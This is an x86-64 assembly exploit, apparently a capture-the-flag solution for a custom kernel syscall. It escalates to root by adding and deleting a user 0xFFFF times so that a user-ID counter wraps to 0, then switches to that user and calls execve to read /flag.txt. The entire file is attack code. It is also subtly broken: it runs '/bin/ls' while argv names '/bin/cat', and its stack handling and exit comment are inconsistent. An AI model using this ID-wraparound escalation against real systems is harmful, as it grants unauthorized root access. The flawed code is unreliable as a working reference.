bits 64
global _start

sys_magic equ 449
sys_exit equ 60
sys_execve equ 59

section .text

; Add and delete a user to cycle through nextId and return it to 0, making the uid of the last child created 0.

_start:

    ; We start as UID 1, and need to add exactly 0xFFFF users to make our last user UID 0
    mov rcx, 0xffff
    .create_user:
        push rcx
        ; Call syscall 449, sys_magic, to add user as child
        mov rax, sys_magic  ; Syscall number
        mov rdi, 0          ; mode = ADD
        mov rsi, username   ; username
        mov rdx, password   ; password
        syscall

        ; If we are not the 0xFFFF'th user, delete the user we created.
        ; If we are, continue to switching to the new user and execve'ing with it
        pop rcx
        cmp rcx, 1
        je .switch_to_user

        push rcx
        ; Delete the created user
        mov rax, sys_magic
        mov rdi, 2          ; mode = DELETE
        mov rsi, username
        syscall

        ; Continue adding and deleting until last user
        pop rcx
        loop .create_user
    
    .switch_to_user:
        pop rcx
        ; Call syscall 449, sys_magic, to switch to child user
        mov rax, sys_magic  ; Syscall number
        mov rdi, 3          ; mode = SWITCH
        mov rsi, username   ; username
        mov rdx, password   ; password
        syscall
    
    ; Call execve on command
    mov rax, sys_execve
    mov rdi, command
    mov rsi, argv
    mov rdx, envp
    syscall

    mov rdi, rax        ; exit code
    
    ; exit(0)
    mov rax, sys_exit   ; exit syscall number
    syscall

section .data

username: db "sudo", 0
password: db "password", 0

argv: dq arg0, arg1, 0
envp: dq 0
command: db "/bin/ls", 0

arg0: db "/bin/cat", 0
arg1: db "/flag.txt", 0